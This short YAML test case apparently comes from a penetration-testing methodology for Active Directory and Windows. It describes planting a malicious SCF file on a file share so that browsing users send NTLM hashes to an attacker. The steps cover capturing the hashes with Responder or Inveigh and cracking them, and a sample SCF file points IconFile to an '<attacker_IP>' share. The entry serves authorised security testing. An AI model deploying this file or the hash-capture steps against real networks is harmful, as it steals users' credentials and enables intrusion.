---
testcase: Interacting with Users - Malicious SCF File on File Share
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1552/
how-to-test: |
  - Craft an SCF file with an icon path pointing to an attacker-controlled SMB share.
  - Place the SCF file in a directory or file share that users are likely to access.
  - Start a tool such as Responder or Inveigh to capture authentication attempts.
  - Wait for a user to access the share and attempt to capture NTLM hashes.
  - Attempt to crack captured hashes and escalate privileges if successful.
  - Example SCF file content:
    [Shell]
    Command=2
    IconFile=\\<attacker_IP>\share\legit.ico
    [Taskbar]
    Command=ToggleDesktop
---
